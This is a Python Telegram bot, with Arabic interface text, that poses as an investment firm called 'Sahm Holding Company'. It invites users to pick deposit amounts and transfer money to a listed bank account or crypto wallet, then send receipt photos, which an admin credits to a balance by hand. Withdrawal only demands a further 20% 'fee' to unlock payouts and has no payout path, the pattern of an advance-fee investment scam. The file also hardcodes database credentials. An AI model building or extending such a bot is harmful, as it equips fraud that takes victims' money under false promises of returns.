import logging
import os
import urllib.parse
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب لإرضاء سيرفر Render ---
server = Flask('')
@server.route('/')
def home(): return "Sahm Holding Bot is Running!"

def run():
    # Render يطلب العمل على بورت 10000 افتراضياً
    server.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

def keep_alive():
    t = Thread(target=run)
    t.start()

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = 'ضع_التوكن_الجديد_هنا' # تأكد من وضع التوكن الجديد المستخرج من BotFather
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

u_enc = urllib.parse.quote_plus('Abduh')
p_enc = urllib.parse.quote_plus('Abduh2026')
MONGO_URI = f"mongodb+srv://{u_enc}:{p_enc}@cluster0.0a4wefx.mongodb.net/DragonFinal?authSource=admin&retryWrites=true&w=majority"

BANK_ACCOUNT = "SA0000000000000000000000"
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"

PRICES_SAR = ["1000", "1500", "2000", "3000", "5000", "7000", "8000", "10000", "15000", "20000", "30000", "50000"]
PRICES_USD = ["300", "400", "500", "600", "800", "1000", "2000", "3000", "5000", "20000", "30000"]
# ===============================================================

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['investment_platform']
    users_col = db['users']
    client.admin.command('ping')
    logger.info("✅ تم الاتصال بسحابة MongoDB بنجاح")
except Exception as e:
    logger.error(f"❌ فشل الاتصال بالمونغو: {e}")
    users_col = None

def get_user_data(uid):
    if users_col is None: return {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
    user = users_col.find_one({"uid": uid})
    if not user:
        user = {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
        users_col.insert_one(user)
    return user

def update_balance(uid, curr, amt):
    if users_col is None: return
    field = "bal_sar" if curr == "sr" else "bal_usd"
    users_col.update_one({"uid": uid}, {"$inc": {field: float(amt)}})

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال)", callback_data='c_sr'), InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("💰 محفظتي", callback_data='wallet')],
        [InlineKeyboardButton("📤 سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    text = f"🏦 **مرحباً بك في شركة سهم القابضة**\n\nالمستثمر: {user.first_name}\nاختر القسم المطلوب:"
    if update.message: await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else: await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data; uid = query.from_user.id
    await query.answer()
    if data == 'main': await start(update, context)
    elif data == 'wallet':
        u = get_user_data(uid)
        await query.edit_message_text(f"📊 **محفظتك:**\n\n🇸🇦: `{u['bal_sar']:,}` ﷼\n🇺🇸: `{u['bal_usd']:,}` $", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]), parse_mode='Markdown')
    elif data == 'withdraw':
        u = get_user_data(uid)
        f_s, f_u = u['bal_sar']*0.2, u['bal_usd']*0.2
        await query.edit_message_text(f"📤 **السحب:**\n\n🇸🇦 رصيدك: `{u['bal_sar']}`\n⚠️ الرسوم (20%): `{f_s}`\n\nادفع الرسوم لفتح البوابة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]), parse_mode='Markdown')
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        p = PRICES_SAR if curr == 'sr' else PRICES_USD
        btns = [[InlineKeyboardButton(f"{v} {('﷼' if curr=='sr' else '$')}", callback_data=f"{curr[0]}_{v}") for v in p[i:i+2]] for i in range(0, len(p), 2)]
        btns.append([InlineKeyboardButton("🔙", callback_data='main')])
        await query.edit_message_text("🏦 اختر المبلغ:", reply_markup=InlineKeyboardMarkup(btns))
    elif data.startswith(('s_', 'u_')):
        curr, amt = ('sr', data.split('_')[1]) if data.startswith('s_') else ('us', data.split('_')[1])
        addr = BANK_ACCOUNT if curr == 'sr' else CRYPTO_WALLET
        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال.", parse_mode='Markdown')
    elif data.startswith(('ok_', 'no_')):
        if uid not in ADMINS_LIST: return
        if data.startswith('ok_'):
            _, c, a, target = data.split('_')
            update_balance(int(target), c, a)
            await query.edit_message_caption("✅ تم التأكيد!")
            try: await context.bot.send_message(int(target), f"🎉 تم إيداع {a} {c} بنجاح!")
            except: pass
        else: await query.edit_message_caption("❌ تم الرفض.")

async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        user = update.effective_user
        await update.message.reply_text("⏳ جاري المراجعة...")
        kb = [[InlineKeyboardButton(f"✅ 1000 ريال", callback_data=f"ok_sr_1000_{user.id}"), InlineKeyboardButton(f"✅ 300 $", callback_data=f"ok_us_300_{user.id}")], [InlineKeyboardButton("❌ رفض", callback_data=f"no_{user.id}")]]
        for adm in ADMINS_LIST:
            try: await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 إيداع: {user.first_name}\nID: `{user.id}`", reply_markup=InlineKeyboardMarkup(kb))
            except: pass

if __name__ == '__main__':
    # تشغيل خادم الويب في الخلفية لإرضاء Render
    keep_alive()
    # تشغيل البوت
    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_receipt))
    app.run_polling(drop_pending_updates=True)
